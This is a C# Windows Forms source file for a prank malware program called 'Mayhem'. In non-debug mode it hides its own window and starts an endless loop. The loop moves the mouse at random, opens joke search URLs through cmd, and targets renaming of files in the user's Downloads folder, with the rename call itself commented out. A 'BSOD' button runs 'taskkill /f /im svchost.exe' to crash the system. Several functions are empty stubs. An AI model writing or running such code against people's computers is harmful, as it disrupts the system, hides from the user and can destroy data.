using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics.Eventing.Reader;

namespace Mayhem
{
    public partial class Form1 : Form
    {
        // ------------------------------ //
        // TODO List //
        // ------------------------------ //
        // - Add change wallpaper function
        // - Add show messagebox function
        // - Add open web browser function
        // - Add move mouse function
        // - Add fake task manager function
        // - Add resize function
        // - Add sound function    
        // - Add file function
        // - Add fake BSOD function
        // - Add BSOD function
        // - Add kill function

        // ------------------------------ //

        // ------------ Variables ------------ //
        bool DebugMode = true;

        public Form1()
        {
            InitializeComponent();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            // Check if debug mode is enabled
            if (DebugMode == true)
            {
                // Show form window
                Log(new LogMessage(LogSeverity.Info, "Debug", "Debug mode enabled."));
            }
            else
            {
                // Hide form window
                Visible = false; // Hide form window.
                ShowInTaskbar = false; // Remove from taskbar.
                Opacity = 0;
                Log(new LogMessage(LogSeverity.Info, "Debug", "Debug mode disabled. (Hidden Window)"));

                // Start the process of causing mayhem
                StartMayhem();
            }
        }


        // ------------ Buttons ------------ //
        private void btnWallpaper_Click(object sender, EventArgs e)
        {

        }

        private async void btnMsgbox_Click(object sender, EventArgs e)
        {
            // Show multiple message boxes simultaneously
            string title = "Default Message Box";
            string message = "This is a default message box.";
            MessageBoxButtons buttons = MessageBoxButtons.OK; // You can change this based on your desired buttons

            // Use Task.Run to run each non-blocking MessageBox on a separate thread
            await Task.Run(() => ShowNonBlockingMessageBox(title, message, buttons));
            await Task.Run(() => ShowNonBlockingMessageBox(title, message, buttons));
            await Task.Run(() => ShowNonBlockingMessageBox(title, message, buttons));
        }

        private void btnWeb_Click(object sender, EventArgs e)
        {
            // Open a web browser to the specified URL
            string[] funnyURLs = { "https://www.google.com/search?q=how+to+remove+a+virus", "https://www.google.com/search?q=how+to+get+free+robux", "https://www.google.com/search?q=fortnite+hacks+free", "https://www.google.com/search?q=how+to+hack+ips", "https://www.google.com/search?q=is+rickroll+still+funny?", "https://www.google.com/search?q=free+russian+malware", "https://www.google.com/search?q=how+do+i+know+if+i+got+hacked?", "https://www.google.com/search?q=Is+there+a+Tinder+for+ghosts?", "https://www.google.com/search?q=How+to+convince+my+cat+to+start+a+YouTube+channel" };

            // Select a random URL
            Random rnd = new Random();
            string URL = funnyURLs[rnd.Next(funnyURLs.Length)];

            openWeb(URL);
        }

        private void btnMouse_Click(object sender, EventArgs e)
        {
            // Generate random coordinates
            Random rnd = new Random();
            int randomX = rnd.Next(0, 1920); // Adjust the range as needed
            int randomY = rnd.Next(0, 1080); // Adjust the range as needed

            // Move the mouse to the random coordinates
            moveMouse(randomX, randomY);
        }

        private void btnTaskmgr_Click(object sender, EventArgs e)
        {

        }

        private void btnResize_Click(object sender, EventArgs e)
        {
            // Get all open windows
            Process[] processes = Process.GetProcesses();

            List<Process> realProcesses = new List<Process>();

            // Log all open windows
            foreach (Process p in processes)
            {
                if (p.MainWindowTitle == null || p.MainWindowTitle == "")
                {
                    // Continue if the window has no title
                    continue;
                }
                else
                {
                    Log(new LogMessage(LogSeverity.Info, "Resize Window", p.MainWindowTitle));
                    // Add the process to the realProcesses list
                    realProcesses.Add(p);
                }
            }

            if (realProcesses.Count == 0)
            {
                // Handle the case where there are no valid processes
                Log(new LogMessage(LogSeverity.Info, "Resize Window", "No valid windows to resize."));
                return;
            }

            // Select a random window
            Random rnd = new Random();
            Process process = realProcesses[rnd.Next(realProcesses.Count)];

            // Log the selected window
            Log(new LogMessage(LogSeverity.Info, "Resize Window", "Selected window: " + process.MainWindowTitle));

            // Resize the window to random width and height
            int randomWidth = rnd.Next(400, 800); // Adjust the range as needed
            int randomHeight = rnd.Next(300, 600); // Adjust the range as needed
            ResizeWindow(process.MainWindowHandle, randomWidth, randomHeight);
        }

        private void btnSound_Click(object sender, EventArgs e)
        {

        }

        private void btnFiles_Click(object sender, EventArgs e)
        {
            // Change files names in the downloads folder
            string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads";
            // Search and destroy
            SearchAndDestroy(path);
        }

        private void btnFakeBSOD_Click(object sender, EventArgs e)
        {
            // Open a form with a fake BSOD
            try
            {
                FakeBSODForm fakeBSODForm = new FakeBSODForm();
                fakeBSODForm.StartPosition = FormStartPosition.CenterScreen; // Adjust the position as needed
                fakeBSODForm.Show();
                // Log
                Log(new LogMessage(LogSeverity.Info, "Fake BSOD", "Opened fake BSOD."));
                // Close the form after 10 seconds
                Task.Delay(10000).ContinueWith(t => fakeBSODForm.Close());
                // Log
                Log(new LogMessage(LogSeverity.Info, "Fake BSOD", "Closed fake BSOD."));
            }
            catch (Exception ex)
            {
                // Log
                Log(new LogMessage(LogSeverity.Error, "Fake BSOD", "Error opening fake BSOD: " + ex.Message));
            }
        }

        private void btnBSOD_Click(object sender, EventArgs e)
        {
            // Execute the BSOD command
            runCommand("taskkill /f /im svchost.exe");
        }

        private void btnKill_Click(object sender, EventArgs e)
        {
            // Kill program
            Process.GetCurrentProcess().Kill();
        }
        private void btnMayhem_Click(object sender, EventArgs e)
        {
            StartMayhem();
        }



        // ------------ Wallpaper ------------ //
        public void changeWallpaper(string PathToImage)
        {

        }


        // ------------ Messagebox ------------ //
        private void ShowNonBlockingMessageBox(string title, string message, MessageBoxButtons buttons)
        {
            if (InvokeRequired)
            {
                // Invoke on the UI thread
                Invoke(new Action(() =>
                {
                    var nonBlockingMessageBoxForm = new NonBlockingMessageBoxForm(title, message, buttons);
                    nonBlockingMessageBoxForm.StartPosition = FormStartPosition.CenterScreen; // Adjust the position as needed
                    nonBlockingMessageBoxForm.Show();
                }));
            }
            else
            {
                // Already on the UI thread, directly show the non-blocking message box
                var nonBlockingMessageBoxForm = new NonBlockingMessageBoxForm(title, message, buttons);
                nonBlockingMessageBoxForm.StartPosition = FormStartPosition.CenterScreen; // Adjust the position as needed
                nonBlockingMessageBoxForm.Show();
            }
        }

        // ------------ Web Browser ------------ //
        public void openWeb(string URL)
        {
            // Open a web browser to the specified URL
            runCommand("start " + URL);
        }

        // ------------ Mouse ------------ //
        public void moveMouse(int X, int Y)
        {
            // Move the mouse to the specified coordinates
            if (InvokeRequired)
            {
                Invoke(new Action(() =>
                {
                    Cursor.Position = new Point(X, Y);
                }));
            }
            else
            {
                Cursor.Position = new Point(X, Y);
            }

            // Log
            Log(new LogMessage(LogSeverity.Info, "Move Mouse", $"Moved mouse to X: {X}, Y: {Y}."));
        }

        // ------------ Task Manager ------------ //

        // ------------ Resize ------------ //
        // Constants for SetWindowPos
        private const uint SWP_NOSIZE = 0x0001;
        private const uint SWP_NOZORDER = 0x0004;

        // Import SetWindowPos function from user32.dll
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
        private void ResizeWindow(IntPtr hWnd, int width, int height)
        {
            try
            {
                SetWindowPos(hWnd, IntPtr.Zero, 0, 0, width, height, SWP_NOSIZE | SWP_NOZORDER);
                // Log
                Log(new LogMessage(LogSeverity.Info, "Resize Window", $"Resized window to width: {width}, height: {height}."));
            }
            catch (Exception ex)
            {
                // Log
                Log(new LogMessage(LogSeverity.Error, "Resize Window", "Error resizing: " + ex.Message));
            }
        }

        // ------------ Sound ------------ //

        // ------------ Files ------------ //
        public void SearchAndDestroy(string path)
        {
            string[] files = Directory.GetFiles(path);
            foreach (string file in files)
            {
                // Rename the file
                string newFileName = Path.GetFileName(file);
                // Make extension into variable
                string extension = Path.GetExtension(file);
                // Generate random funny name
                Random rnd = new Random();
                string[] funnyNames = { "Im-I-a-joke-to-you?", "haha", "lol", "xd", "am-I-infected?", "lmao", "hilarious", "comedy", "am-I-injected?", "jokester", "joker", "jokes", "joking", "joked", "jokeing", "jokestering", "jokering", "jokesters", "jokers", "jokeings", "jokesters", "joke" };
                // Select random funny name
                string funnyName = funnyNames[rnd.Next(funnyNames.Length)];
                // Make funny name + extension into new file name
                newFileName = funnyName + extension;
                // Rename the file
                //File.Move(file, newFileName);
                // Log
                Log(new LogMessage(LogSeverity.Info, "Files", $"Renamed file {file} to {newFileName}."));
            }
        }

        // ------------ Fake BSOD ------------ //

        // ------------ BSOD ------------ //

        // ------------ Kill ------------ //


        // ------------ General Function ------------ //
        private Task Log(LogMessage arg)
        {
            // Handle logging (e.g., display in a TextBox)
            Invoke(new Action(() =>
            {
                txtOutput.AppendText(arg + "\r\n");
            }));

            return Task.CompletedTask;
        }

        public string runCommand(string Command)
        {
            // Run a cmd command and return the output
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c " + Command;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.Start();

            // Log the command and output
            Log(new LogMessage(LogSeverity.Info, "CMD Execution", Command));
            Log(new LogMessage(LogSeverity.Info, "CMD Execution", process.StandardOutput.ReadToEnd()));

            return process.StandardOutput.ReadToEnd();
        }


        // ------------ Mayhem ------------ //
        public async void StartMayhem()
        {
            // Start the process of causing mayhem
            // move mouse to random coordinates
            int i = 0;
            int x = 0;
            int y = 0;

            while (true)
            {
                if (100 <= i)
                {
                    // Break out of the loop
                    continue;
                }
                else
                {
                    i++;
                    // Generate random coordinates
                    Random rnd = new Random();
                    int randomX = rnd.Next(0, 1920); // Adjust the range as needed
                    int randomY = rnd.Next(0, 1080); // Adjust the range as needed

                    // Move the mouse to the random coordinates
                    moveMouse(randomX, randomY);    
                }

                // Only execute the following code every 10 iterations
                if (x == 30)
                {
                    // Open a web browser to the specified URL
                    string[] funnyURLs = { "https://www.google.com/search?q=how+to+remove+a+virus", "https://www.google.com/search?q=how+to+get+free+robux", "https://www.google.com/search?q=fortnite+hacks+free", "https://www.google.com/search?q=how+to+hack+ips", "https://www.google.com/search?q=is+rickroll+still+funny?", "https://www.google.com/search?q=free+russian+malware", "https://www.google.com/search?q=how+do+i+know+if+i+got+hacked?", "https://www.google.com/search?q=Is+there+a+Tinder+for+ghosts?", "https://www.google.com/search?q=How+to+convince+my+cat+to+start+a+YouTube+channel" };

                    // Select a random URL
                    Random rnd = new Random();
                    string URL = funnyURLs[rnd.Next(funnyURLs.Length)];

                    openWeb(URL);

                    // Reset x
                    x = 0;
                }
                else
                {
                    // Increment x
                    x++;
                }

                // Only execute the following code every 20 iterations
                if (y == 20)
                {
                    // Change files names in the downloads folder
                    string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads";
                    // Search and destroy
                    SearchAndDestroy(path);

                    // Reset y
                    y = 0;
                }
                else
                {
                    // Increment y
                    y++;
                }

                // Wait for 0.5 second
                await Task.Delay(500);
            }

            // show messagebox
        }

    }

    // ------------ Logging ------------ //
    public enum LogSeverity
    {
        Info,
        Warning,
        Error
    }

    public class LogMessage
    {
        public LogSeverity Severity { get; }
        public string Source { get; }
        public string Message { get; }

        public LogMessage(LogSeverity severity, string source, string message)
        {
            Severity = severity;
            Source = source;
            Message = message;
        }

        public override string ToString()
        {
            return $"[{Severity}] [{Source}] {Message}";
        }
    }
}
